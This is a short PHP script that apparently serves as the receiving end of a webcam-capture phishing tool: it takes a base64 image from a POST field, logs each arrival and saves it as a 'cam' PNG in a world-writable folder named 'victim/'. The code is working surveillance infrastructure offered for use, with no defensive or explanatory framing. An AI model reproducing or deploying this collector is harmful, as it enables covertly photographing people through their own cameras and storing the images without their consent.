<?php
$date = date('dMYHis');
$imageData = $_POST['cat'];

if (!empty($_POST['cat'])) {
    error_log("Received" . "\r\n", 3, "Log.log");
}

$filteredData = substr($imageData, strpos($imageData, ",") + 1);
$unencodedData = base64_decode($filteredData);
$folderPath = 'victim/';

// Check if the folder doesn't exist, create it
if (!file_exists($folderPath) && !is_dir($folderPath)) {
    mkdir($folderPath, 0777, true);
}

$fp = fopen($folderPath . 'cam' . $date . '.png', 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

exit();

?>